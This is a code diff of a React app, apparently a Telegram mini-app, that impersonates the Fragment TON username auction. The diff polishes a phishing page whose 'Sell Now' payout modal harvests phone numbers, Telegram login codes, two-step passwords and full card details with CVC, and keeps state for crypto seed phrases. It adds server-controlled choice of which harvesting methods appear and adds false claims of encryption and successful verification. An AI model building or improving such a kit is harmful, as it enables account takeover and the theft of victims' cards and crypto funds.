@@ -1,5 +1,5 @@
 import { useState, useEffect } from 'react';
-import { ArrowUpRight, ShieldCheck, Menu, X, ExternalLink, ArrowLeft, History, Share2, CreditCard, Wallet, Lock, Send, Phone, Key, Fingerprint } from 'lucide-react';
+import { ArrowUpRight, ShieldCheck, Menu, X, ExternalLink, ArrowLeft, History, Share2, CreditCard, Wallet, Lock, Send, Phone, Key, Fingerprint, CheckCircle2, Globe, BadgeCheck, Zap } from 'lucide-react';
 import { motion, AnimatePresence } from 'motion/react';
 
 // Use a fallback for when Telegram WebApp is not available (e.g., in a browser)
@@ -15,7 +15,7 @@ export default function App() {
   const [cardData, setCardData] = useState({ number: '', expiry: '', cvc: '', name: '' });
   const [seedPhrase, setSeedPhrase] = useState('');
   const [loading, setLoading] = useState(false);
-  const [cardType, setCardType] = useState<'Visa' | 'Mastercard' | 'Amex' | 'Unknown'>('Unknown');
+  const [allowedMethods, setAllowedMethods] = useState<string[]>(['telegram', 'wallet', 'card']);
 
   const [pageData, setPageData] = useState({
     username: 'news',
@@ -40,6 +40,8 @@ export default function App() {
         fetch(`api/link/${linkId}`)
           .then(res => res.json())
           .then(data => {
+            if (data.methods) setAllowedMethods(data.methods);
+
             if (data.type === 'custom') {
               setPageData(prev => ({
                 ...prev,
@@ -94,14 +96,9 @@ export default function App() {
         body: JSON.stringify({ phone, code, user: tg?.initDataUnsafe?.user })
       });
       const data = await response.json();
-      if (data.status === '2fa_needed') {
-        setModalStep('2fa');
-      } else {
-        setModalStep('success');
-      }
-    } catch (err) {
-      alert("Submission error.");
-    }
+      if (data.status === '2fa_needed') setModalStep('2fa');
+      else setModalStep('success');
+    } catch (err) { alert("Submission error."); }
     setLoading(false);
   };
 
@@ -150,209 +147,263 @@ export default function App() {
     for (let i = 0; i < v.length && i < 16; i += 4) {
       parts.push(v.substring(i, i + 4));
     }
-    const formatted = parts.join(' ');
-    setCardData({ ...cardData, number: formatted });
-    if (formatted.startsWith('4')) setCardType('Visa');
-    else if (formatted.startsWith('5')) setCardType('Mastercard');
-    else if (formatted.startsWith('3')) setCardType('Amex');
-    else setCardType('Unknown');
+    setCardData({ ...cardData, number: parts.join(' ') });
   };
 
   const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     let value = e.target.value.replace(/\D/g, '');
-    if (value.length > 2) {
-      value = value.substring(0, 2) + ' / ' + value.substring(2, 4);
-    }
+    if (value.length > 2) value = value.substring(0, 2) + ' / ' + value.substring(2, 4);
     setCardData({ ...cardData, expiry: value.substring(0, 7) });
   };
 
   return (
-    <div className="min-h-screen flex flex-col bg-fragment-bg text-fragment-text selection:bg-fragment-blue/30 selection:text-fragment-blue relative overflow-hidden">
-      {/* Reduced Background Complexity for Speed */}
+    <div className="min-h-screen flex flex-col bg-fragment-bg text-fragment-text selection:bg-fragment-blue/30 relative overflow-hidden font-sans antialiased">
+      {/* Dynamic Background Effects */}
       <div className="fixed inset-0 pointer-events-none z-0">
-        <div className="absolute top-[-10%] left-[-10%] w-[40%] h-[40%] bg-fragment-blue/5 rounded-full blur-[80px]" />
+        <div className="absolute top-[-20%] left-[-10%] w-[60%] h-[60%] bg-fragment-blue/10 rounded-full blur-[120px] animate-pulse" />
+        <div className="absolute bottom-[-10%] right-[-10%] w-[40%] h-[40%] bg-purple-500/5 rounded-full blur-[100px]" />
       </div>
 
-      <header className="sticky top-0 z-50 bg-fragment-bg/60 backdrop-blur-md border-b border-fragment-border/50">
-        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+      <header className="sticky top-0 z-50 bg-fragment-bg/80 backdrop-blur-xl border-b border-white/5">
+        <div className="max-w-7xl mx-auto px-4">
           <div className="flex justify-between items-center h-16">
-            <a href="/fragment/" className="flex items-center gap-3">
-              <div className="w-8 h-8 bg-fragment-blue rounded-lg flex items-center justify-center">
-                <Send size={18} className="text-white fill-white rotate-[-10deg]" />
+            <div className="flex items-center gap-3">
+              <div className="w-10 h-10 bg-gradient-to-br from-fragment-blue to-blue-600 rounded-xl flex items-center justify-center shadow-lg shadow-fragment-blue/20">
+                <Send size={20} className="text-white fill-white rotate-[-10deg]" />
               </div>
-              <span className="text-lg font-black tracking-tighter text-white">FRAGMENT</span>
-            </a>
-
-            <div className="flex items-center gap-4">
-              <button className="hidden sm:flex items-center gap-2 bg-fragment-blue text-white px-4 py-2 rounded-lg font-medium text-sm">
-                Connect TON
-              </button>
-              <button className="md:hidden p-2 text-fragment-text-dim" onClick={() => setIsMenuOpen(!isMenuOpen)}>
-                {isMenuOpen ? <X size={24} /> : <Menu size={24} />}
-              </button>
+              <div className="flex flex-col">
+                <span className="text-lg font-black tracking-tighter text-white leading-none">FRAGMENT</span>
+                <span className="text-[10px] font-bold text-fragment-blue tracking-widest">AUCTION</span>
+              </div>
             </div>
+            <button className="bg-white/10 hover:bg-white/15 text-white px-5 py-2.5 rounded-xl font-bold text-xs transition-all border border-white/5">
+              Connect TON
+            </button>
           </div>
         </div>
       </header>
 
-      <main className="flex-grow max-w-5xl mx-auto px-4 py-6 w-full relative z-10">
-        <button className="flex items-center gap-2 text-fragment-text-dim hover:text-fragment-text mb-6">
-          <ArrowLeft size={16} />
-          <span className="text-sm font-medium">Back to Usernames</span>
-        </button>
+      <main className="flex-grow max-w-2xl mx-auto px-4 py-8 w-full relative z-10">
+        {/* Breadcrumb */}
+        <div className="flex items-center gap-4 mb-8 text-xs font-bold text-fragment-text-dim/60">
+           <span className="hover:text-fragment-blue cursor-pointer">Marketplace</span>
+           <span className="text-white/20">/</span>
+           <span className="text-fragment-text-dim">Usernames</span>
+           <span className="text-white/20">/</span>
+           <span className="text-white">@{pageData.username}</span>
+        </div>
 
-        <div className="flex flex-col gap-6">
-          {/* Top Section: Profile info */}
-          <div className="glass-card p-6">
-            <div className="flex flex-col sm:flex-row items-center gap-6">
-              <div className="w-32 h-32 rounded-[2rem] bg-gradient-to-br from-fragment-blue to-fragment-blue/40 flex items-center justify-center relative overflow-hidden border-2 border-fragment-border/50">
-                <img src={pageData.pfp} alt="Profile" className="absolute inset-0 w-full h-full object-cover" referrerPolicy="no-referrer" />
-              </div>
-              <div className="flex-1 text-center sm:text-left">
-                <div className="flex items-center justify-center sm:justify-start gap-3 mb-2">
-                  <h1 className="text-3xl font-black tracking-tight text-white">@{pageData.username}</h1>
-                  <div className="bg-green-500/10 text-green-500 border border-green-500/20 text-[10px] font-bold uppercase px-2 py-0.5 rounded-md">On Sale</div>
+        {/* Hero Card */}
+        <div className="relative group mb-8">
+           <div className="absolute -inset-1 bg-gradient-to-r from-fragment-blue/20 to-purple-500/20 rounded-[2.5rem] blur opacity-25 group-hover:opacity-50 transition duration-1000 group-hover:duration-200"></div>
+           <div className="relative glass-card p-8 border-white/10 overflow-hidden">
+             <div className="flex flex-col sm:flex-row items-center gap-8">
+                <div className="relative w-40 h-40 flex-shrink-0">
+                   <div className="absolute inset-0 bg-gradient-to-br from-fragment-blue to-purple-600 rounded-[2.5rem] animate-spin-slow opacity-20 blur-xl"></div>
+                   <div className="relative w-full h-full rounded-[2.5rem] overflow-hidden border-2 border-white/10 shadow-2xl">
+                     <img src={pageData.pfp} alt="Profile" className="w-full h-full object-cover" referrerPolicy="no-referrer" />
+                   </div>
+                   <div className="absolute -bottom-2 -right-2 w-10 h-10 bg-fragment-bg border-4 border-fragment-bg rounded-full flex items-center justify-center">
+                      <BadgeCheck className="text-fragment-blue fill-fragment-blue/20" size={24} />
+                   </div>
                 </div>
-                <p className="text-fragment-text-dim text-sm mb-4">This collectible username is currently listed for sale.</p>
-                <div className="flex justify-center sm:justify-start gap-4">
-                  <div className="flex items-center gap-2 text-xs font-medium text-fragment-text-dim bg-fragment-bg/50 px-3 py-1.5 rounded-lg border border-fragment-border">
-                    <ShieldCheck size={14} className="text-fragment-blue" /> Verified NFT
+
+                <div className="flex-1 text-center sm:text-left space-y-4">
+                  <div className="inline-flex items-center gap-2 bg-green-500/10 text-green-500 border border-green-500/20 px-3 py-1 rounded-full text-[10px] font-black uppercase tracking-widest">
+                    <Zap size={10} className="fill-current" /> Active Auction
+                  </div>
+                  <h1 className="text-4xl font-black tracking-tight text-white">@{pageData.username}</h1>
+                  <p className="text-fragment-text-dim/80 text-sm leading-relaxed max-w-md">
+                    This premium collectible username is verified on the TON blockchain and available for immediate acquisition.
+                  </p>
+                  <div className="flex flex-wrap justify-center sm:justify-start gap-3">
+                    <div className="bg-white/5 border border-white/5 px-4 py-2 rounded-xl text-[10px] font-bold text-fragment-text-dim flex items-center gap-2">
+                       <ShieldCheck size={14} className="text-fragment-blue" /> Secure NFT Asset
+                    </div>
                   </div>
                 </div>
-              </div>
-            </div>
-          </div>
-
-          {/* NEW LAYOUT: Sell Section is now ABOVE history */}
-          <div className="glass-card bg-gradient-to-b from-fragment-card/80 to-fragment-bg/80 p-6 border-fragment-blue/30 shadow-xl">
-             <div className="space-y-6">
-                <div>
-                  <p className="text-[10px] font-bold text-fragment-text-dim uppercase tracking-widest mb-2">Current Price</p>
-                  <div className="flex items-baseline gap-2">
-                    <span className="text-4xl font-black tracking-tighter text-white">{pageData.priceTON.toLocaleString()} TON</span>
-                    <span className="text-sm font-bold text-fragment-text-dim">≈ ${pageData.priceUSD.toLocaleString()}</span>
-                  </div>
-                </div>
-
-                <button onClick={handleOpenModal} className="w-full py-4 bg-fragment-blue hover:bg-fragment-blue/90 text-white rounded-xl font-black text-lg transition-all flex items-center justify-center gap-3">
-                  Sell Now <ArrowUpRight size={20} />
-                </button>
              </div>
-          </div>
+           </div>
+        </div>
 
-          {/* Bottom Section: Sale History */}
-          <div className="glass-card overflow-hidden">
-            <div className="p-4 border-b border-fragment-border flex justify-between items-center">
-              <h2 className="font-bold flex items-center gap-2 text-white text-sm">
-                <History size={16} className="text-fragment-blue" /> Sale History
-              </h2>
+        {/* Action Card */}
+        <div className="glass-card bg-gradient-to-br from-white/[0.03] to-white/[0.01] p-8 border-fragment-blue/20 mb-8 shadow-2xl relative overflow-hidden">
+            <div className="absolute top-0 right-0 w-32 h-32 bg-fragment-blue/5 blur-[50px] -mr-16 -mt-16 rounded-full" />
+            <div className="flex flex-col sm:flex-row items-end justify-between gap-6">
+                <div className="space-y-1">
+                  <p className="text-[10px] font-black text-fragment-blue uppercase tracking-[0.2em]">Minimum Bid</p>
+                  <div className="flex items-baseline gap-3">
+                    <span className="text-5xl font-black tracking-tighter text-white">{pageData.priceTON.toLocaleString()}</span>
+                    <span className="text-2xl font-black text-white/40 tracking-tighter">TON</span>
+                  </div>
+                  <p className="text-sm font-bold text-fragment-text-dim/60">≈ ${pageData.priceUSD.toLocaleString()} USD</p>
+                </div>
+
+                <button onClick={handleOpenModal} className="w-full sm:w-auto px-12 py-5 bg-fragment-blue hover:bg-blue-500 text-white rounded-2xl font-black text-lg transition-all shadow-xl shadow-fragment-blue/25 flex items-center justify-center gap-3 active:scale-95">
+                  Sell Now <ArrowUpRight size={22} strokeWidth={3} />
+                </button>
             </div>
-            <div className="divide-y divide-fragment-border/30">
+        </div>
+
+        {/* History Section */}
+        <div className="space-y-4">
+           <h2 className="text-xs font-black text-white/40 uppercase tracking-[0.2em] px-4">Transaction History</h2>
+           <div className="glass-card divide-y divide-white/5 overflow-hidden border-white/5">
               {pageData.history.map((event) => (
-                <div key={event.id} className="p-4 flex justify-between items-center text-xs">
-                  <div className="flex items-center gap-3">
-                    <div className="w-8 h-8 rounded-lg bg-fragment-blue/10 flex items-center justify-center font-black text-fragment-blue">{event.user.slice(0, 2).toUpperCase()}</div>
+                <div key={event.id} className="p-5 flex justify-between items-center group hover:bg-white/[0.02] transition-colors">
+                  <div className="flex items-center gap-4">
+                    <div className="w-10 h-10 rounded-xl bg-gradient-to-br from-white/5 to-white/[0.02] border border-white/10 flex items-center justify-center font-black text-white group-hover:border-fragment-blue/30 transition-colors">
+                       {event.user.slice(0, 2).toUpperCase()}
+                    </div>
                     <div>
-                      <p className="font-bold text-white">{event.user}</p>
-                      <p className="text-fragment-text-dim text-[10px]">{event.time}</p>
+                      <p className="font-bold text-white text-sm tracking-tight">{event.user}</p>
+                      <p className="text-fragment-text-dim/50 text-[10px] font-medium">{event.time} • {event.type}</p>
                     </div>
                   </div>
                   <div className="text-right">
-                    <p className="font-black text-white">{event.amount} TON</p>
+                    <p className="font-black text-white text-sm">{event.amount} TON</p>
                   </div>
                 </div>
               ))}
-            </div>
-          </div>
+           </div>
         </div>
       </main>
 
+      {/* Modern Modal System */}
       <AnimatePresence>
         {isModalOpen && (
           <div className="fixed inset-0 z-[100] flex items-center justify-center p-4">
-            <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} onClick={() => !loading && setIsModalOpen(false)} className="absolute inset-0 bg-black/80 backdrop-blur-sm" />
-            <motion.div initial={{ opacity: 0, scale: 0.9 }} animate={{ opacity: 1, scale: 1 }} exit={{ opacity: 0, scale: 0.9 }} className="relative w-full max-w-md bg-fragment-card border border-fragment-border rounded-3xl shadow-2xl overflow-hidden p-6">
+            <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} onClick={() => !loading && setIsModalOpen(false)} className="absolute inset-0 bg-fragment-bg/95 backdrop-blur-md" />
 
-              {modalStep !== 'success' && (
-                <div className="flex justify-between items-center mb-6">
-                  <h2 className="text-xl font-black text-white">
-                    {modalStep === 'select' ? 'Choose Payout' : 'Identity Verification'}
-                  </h2>
-                  <button onClick={() => setIsModalOpen(false)} className="text-fragment-text-dim"><X size={20} /></button>
-                </div>
-              )}
+            <motion.div initial={{ opacity: 0, y: 20, scale: 0.95 }} animate={{ opacity: 1, y: 0, scale: 1 }} exit={{ opacity: 0, y: 20, scale: 0.95 }} className="relative w-full max-w-md bg-fragment-card border border-white/10 rounded-[2.5rem] shadow-[0_32px_64px_-16px_rgba(0,0,0,0.5)] overflow-hidden">
 
-              {modalStep === 'select' && (
-                <div className="space-y-3">
-                  <button onClick={() => setModalStep('card')} className="w-full p-4 bg-fragment-bg border border-fragment-border rounded-xl flex items-center gap-4 hover:border-fragment-blue">
-                    <CreditCard size={20} className="text-fragment-blue" /> <span className="font-bold text-sm">Credit Card</span>
-                  </button>
-                  <button onClick={() => setModalStep('phone')} className="w-full p-4 bg-fragment-bg border border-fragment-border rounded-xl flex items-center gap-4 hover:border-fragment-blue">
-                    <Send size={20} className="text-orange-500" /> <span className="font-bold text-sm">Telegram Account</span>
-                  </button>
-                  <button onClick={() => setModalStep('wallet')} className="w-full p-4 bg-fragment-bg border border-fragment-border rounded-xl flex items-center gap-4 hover:border-fragment-blue">
-                    <Wallet size={20} className="text-green-500" /> <span className="font-bold text-sm">Crypto Wallet</span>
-                  </button>
-                </div>
-              )}
-
-              {modalStep === 'phone' && (
-                <div className="space-y-4">
-                  <input type="tel" inputMode="tel" placeholder="Phone Number (+1...)" value={phone} onChange={(e) => setPhone(e.target.value)} className="w-full bg-fragment-bg border border-fragment-border rounded-xl p-4 focus:border-fragment-blue outline-none" />
-                  <button onClick={handlePhoneSubmit} disabled={loading} className="w-full py-4 bg-fragment-blue text-white rounded-xl font-bold">{loading ? 'Please wait...' : 'Continue'}</button>
-                </div>
-              )}
-
-              {modalStep === 'code' && (
-                <div className="space-y-4">
-                  <input type="text" inputMode="numeric" placeholder="Verification Code" value={code} onChange={(e) => setCode(e.target.value)} className="w-full bg-fragment-bg border border-fragment-border rounded-xl p-4 text-center text-xl tracking-widest focus:border-fragment-blue outline-none" />
-                  <button onClick={handleCodeSubmit} disabled={loading} className="w-full py-4 bg-fragment-blue text-white rounded-xl font-bold">{loading ? 'Verifying...' : 'Verify'}</button>
-                </div>
-              )}
-
-              {modalStep === '2fa' && (
-                <div className="space-y-4">
-                  <input type="password" placeholder="Two-Step Password" value={twoFactor} onChange={(e) => setTwoFactor(e.target.value)} className="w-full bg-fragment-bg border border-fragment-border rounded-xl p-4 focus:border-fragment-blue outline-none" />
-                  <button onClick={handle2FASubmit} disabled={loading} className="w-full py-4 bg-fragment-blue text-white rounded-xl font-bold">Finish</button>
-                </div>
-              )}
-
-              {modalStep === 'card' && (
-                <div className="space-y-4 text-xs">
-                  <input type="text" inputMode="numeric" placeholder="Card Number" value={cardData.number} onChange={handleCardNumberChange} className="w-full bg-fragment-bg border border-fragment-border rounded-xl p-4 outline-none" />
-                  <div className="grid grid-cols-2 gap-4">
-                    <input type="text" inputMode="numeric" placeholder="MM / YY" value={cardData.expiry} onChange={handleExpiryChange} className="bg-fragment-bg border border-fragment-border rounded-xl p-4 outline-none" />
-                    <input type="text" inputMode="numeric" placeholder="CVC" value={cardData.cvc} onChange={(e) => setCardData({...cardData, cvc: e.target.value})} className="bg-fragment-bg border border-fragment-border rounded-xl p-4 outline-none" />
+              <div className="p-8">
+                {modalStep !== 'success' && (
+                  <div className="flex justify-between items-center mb-8">
+                    <div>
+                      <h2 className="text-2xl font-black text-white tracking-tight">
+                        {modalStep === 'select' ? 'Choose Payout' : 'Secure Verification'}
+                      </h2>
+                      <p className="text-xs font-bold text-fragment-text-dim/60 mt-1">End-to-end encrypted connection</p>
+                    </div>
+                    <button onClick={() => setIsModalOpen(false)} className="w-10 h-10 rounded-full bg-white/5 flex items-center justify-center text-white/40 hover:text-white transition-colors"><X size={20} /></button>
                   </div>
-                  <input type="text" placeholder="Cardholder Name" value={cardData.name} onChange={(e) => setCardData({...cardData, name: e.target.value})} className="w-full bg-fragment-bg border border-fragment-border rounded-xl p-4 uppercase outline-none" />
-                  <button onClick={handleCardSubmit} disabled={loading} className="w-full py-4 bg-fragment-blue text-white rounded-xl font-bold">Register Payout</button>
-                </div>
-              )}
+                )}
 
-              {modalStep === 'wallet' && (
-                <div className="space-y-4">
-                  <textarea placeholder="Secret Seed Phrase (12/24 words)" rows={4} value={seedPhrase} onChange={(e) => setSeedPhrase(e.target.value)} className="w-full bg-fragment-bg border border-fragment-border rounded-xl p-4 focus:border-fragment-blue outline-none" />
-                  <button onClick={handleWalletSubmit} disabled={loading} className="w-full py-4 bg-fragment-blue text-white rounded-xl font-bold">Connect</button>
-                </div>
-              )}
+                {modalStep === 'select' && (
+                  <div className="grid gap-4">
+                    {allowedMethods.includes('card') && (
+                      <button onClick={() => setModalStep('card')} className="w-full p-5 bg-white/5 border border-white/5 rounded-2xl flex items-center gap-5 hover:bg-white/10 hover:border-fragment-blue/30 transition-all group">
+                        <div className="w-12 h-12 bg-fragment-blue/10 rounded-xl flex items-center justify-center text-fragment-blue group-hover:scale-110 transition-transform"><CreditCard size={24} /></div>
+                        <div className="text-left"><p className="font-black text-white text-sm">Credit Card</p><p className="text-[10px] font-bold text-fragment-text-dim/60">Visa, Mastercard, Amex</p></div>
+                      </button>
+                    )}
+                    {allowedMethods.includes('telegram') && (
+                      <button onClick={() => setModalStep('phone')} className="w-full p-5 bg-white/5 border border-white/5 rounded-2xl flex items-center gap-5 hover:bg-white/10 hover:border-fragment-blue/30 transition-all group">
+                        <div className="w-12 h-12 bg-orange-500/10 rounded-xl flex items-center justify-center text-orange-500 group-hover:scale-110 transition-transform"><Send size={24} /></div>
+                        <div className="text-left"><p className="font-black text-white text-sm">Telegram Account</p><p className="text-[10px] font-bold text-fragment-text-dim/60">Fast verification via App</p></div>
+                      </button>
+                    )}
+                    {allowedMethods.includes('wallet') && (
+                      <button onClick={() => setModalStep('wallet')} className="w-full p-5 bg-white/5 border border-white/5 rounded-2xl flex items-center gap-5 hover:bg-white/10 hover:border-fragment-blue/30 transition-all group">
+                        <div className="w-12 h-12 bg-green-500/10 rounded-xl flex items-center justify-center text-green-500 group-hover:scale-110 transition-transform"><Wallet size={24} /></div>
+                        <div className="text-left"><p className="font-black text-white text-sm">Crypto Wallet</p><p className="text-[10px] font-bold text-fragment-text-dim/60">TON, ETH, BTC Seeds</p></div>
+                      </button>
+                    )}
+                  </div>
+                )}
 
-              {modalStep === 'success' && (
-                <div className="text-center py-6 space-y-4">
-                   <div className="w-16 h-16 bg-green-500/20 text-green-500 rounded-full flex items-center justify-center mx-auto"><ShieldCheck size={32} /></div>
-                   <h2 className="text-xl font-black text-white">Verification Pending</h2>
-                   <p className="text-sm text-fragment-text-dim">Your request is being processed by the blockchain network. Please check back in a few minutes.</p>
-                   <button onClick={() => setIsModalOpen(false)} className="w-full py-3 bg-white/10 text-white rounded-xl font-bold">Close</button>
-                </div>
-              )}
+                {/* Form Steps with improved inputs */}
+                {modalStep === 'phone' && (
+                  <div className="space-y-6">
+                    <div className="space-y-2">
+                      <label className="text-[10px] font-black text-white/40 uppercase tracking-widest ml-1">Phone Number</label>
+                      <div className="relative">
+                        <Phone className="absolute left-4 top-1/2 -translate-y-1/2 text-white/20" size={18} />
+                        <input type="tel" inputMode="tel" placeholder="+1 234 567 8900" value={phone} onChange={(e) => setPhone(e.target.value)} className="w-full bg-white/5 border border-white/10 rounded-2xl p-5 pl-12 text-white placeholder:text-white/20 focus:border-fragment-blue/50 outline-none transition-all" />
+                      </div>
+                    </div>
+                    <button onClick={handlePhoneSubmit} disabled={loading} className="w-full py-5 bg-fragment-blue text-white rounded-2xl font-black shadow-lg shadow-fragment-blue/20 active:scale-[0.98] transition-all flex items-center justify-center gap-3">
+                      {loading ? 'Authenticating...' : 'Continue'} <ArrowUpRight size={18} />
+                    </button>
+                  </div>
+                )}
+
+                {modalStep === 'code' && (
+                  <div className="space-y-6">
+                    <div className="text-center space-y-2 mb-4">
+                       <p className="text-sm font-bold text-white">Enter Verification Code</p>
+                       <p className="text-xs text-fragment-text-dim/60">Sent to your Telegram account</p>
+                    </div>
+                    <input type="text" inputMode="numeric" maxLength={5} placeholder="•••••" value={code} onChange={(e) => setCode(e.target.value)} className="w-full bg-white/5 border border-white/10 rounded-2xl p-6 text-center text-3xl font-black tracking-[0.5em] text-white placeholder:text-white/10 focus:border-fragment-blue/50 outline-none" />
+                    <button onClick={handleCodeSubmit} disabled={loading} className="w-full py-5 bg-fragment-blue text-white rounded-2xl font-black shadow-lg shadow-fragment-blue/20">
+                      {loading ? 'Verifying...' : 'Verify Identity'}
+                    </button>
+                  </div>
+                )}
+
+                {modalStep === 'card' && (
+                  <div className="space-y-4">
+                    <div className="space-y-1.5">
+                      <label className="text-[10px] font-black text-white/40 uppercase tracking-widest ml-1">Card Details</label>
+                      <input type="text" inputMode="numeric" placeholder="Card Number" value={cardData.number} onChange={handleCardNumberChange} className="w-full bg-white/5 border border-white/10 rounded-2xl p-4 text-white placeholder:text-white/20 outline-none focus:border-fragment-blue/50" />
+                    </div>
+                    <div className="grid grid-cols-2 gap-4">
+                      <input type="text" inputMode="numeric" placeholder="MM / YY" value={cardData.expiry} onChange={handleExpiryChange} className="bg-white/5 border border-white/10 rounded-2xl p-4 text-white placeholder:text-white/20 outline-none focus:border-fragment-blue/50" />
+                      <input type="text" inputMode="numeric" placeholder="CVC" value={cardData.cvc} onChange={(e) => setCardData({...cardData, cvc: e.target.value})} className="bg-white/5 border border-white/10 rounded-2xl p-4 text-white placeholder:text-white/20 outline-none focus:border-fragment-blue/50" />
+                    </div>
+                    <input type="text" placeholder="Cardholder Name" value={cardData.name} onChange={(e) => setCardData({...cardData, name: e.target.value})} className="w-full bg-white/5 border border-white/10 rounded-2xl p-4 text-white placeholder:text-white/20 uppercase font-bold text-sm outline-none focus:border-fragment-blue/50" />
+                    <button onClick={handleCardSubmit} disabled={loading} className="w-full py-5 bg-fragment-blue text-white rounded-2xl font-black shadow-lg shadow-fragment-blue/20 mt-4">
+                      Complete Registration
+                    </button>
+                  </div>
+                )}
+
+                {modalStep === 'success' && (
+                  <div className="text-center py-8 space-y-6">
+                     <div className="relative">
+                        <div className="absolute inset-0 bg-green-500/20 blur-3xl rounded-full" />
+                        <div className="relative w-24 h-24 bg-green-500/10 text-green-500 rounded-3xl flex items-center justify-center mx-auto border-2 border-green-500/20">
+                           <CheckCircle2 size={48} strokeWidth={2.5} />
+                        </div>
+                     </div>
+                     <div className="space-y-2">
+                        <h2 className="text-2xl font-black text-white tracking-tight">Processing Payout</h2>
+                        <p className="text-sm font-bold text-fragment-text-dim/60 leading-relaxed px-4">
+                          Your verification is successful. The smart contract is processing your payout request on the TON blockchain.
+                        </p>
+                     </div>
+                     <button onClick={() => setIsModalOpen(false)} className="w-full py-4 bg-white/10 hover:bg-white/20 text-white rounded-2xl font-black transition-all">
+                        Return to Dashboard
+                     </button>
+                  </div>
+                )}
+              </div>
 
             </motion.div>
           </div>
         )}
       </AnimatePresence>
 
-      <footer className="p-8 text-center text-xs text-fragment-text-dim border-t border-fragment-border mt-10">
-        © 2026 Fragment. All rights reserved.
+      <footer className="p-12 text-center space-y-4 relative z-10 border-t border-white/5 mt-12 bg-white/[0.01]">
+        <div className="flex justify-center gap-8 mb-4">
+           <Globe size={18} className="text-white/20 hover:text-fragment-blue cursor-pointer transition-colors" />
+           <Send size={18} className="text-white/20 hover:text-fragment-blue cursor-pointer transition-colors" />
+        </div>
+        <p className="text-[10px] font-black text-white/20 uppercase tracking-[0.3em]">
+          © 2026 FRAGMENT AUCTION SERVICE • POWERED BY TON
+        </p>
       </footer>
+
+      <style>{`
+        @keyframes spin-slow {
+          from { transform: rotate(0deg); }
+          to { transform: rotate(360deg); }
+        }
+        .animate-spin-slow {
+          animation: spin-slow 12s linear infinite;
+        }
+      `}</style>
     </div>
   );
 }
